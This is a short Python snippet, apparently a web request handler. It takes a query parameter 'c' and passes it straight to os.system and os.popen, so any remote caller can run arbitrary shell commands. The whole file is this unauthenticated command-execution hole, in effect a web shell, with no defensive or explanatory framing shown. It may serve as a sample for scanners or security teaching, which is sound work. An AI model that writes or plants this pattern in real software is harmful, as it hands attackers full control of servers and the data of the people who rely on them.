import os


def handler(request):
    cmd = request.args.get("c")
    os.system(cmd)
    os.popen(cmd)
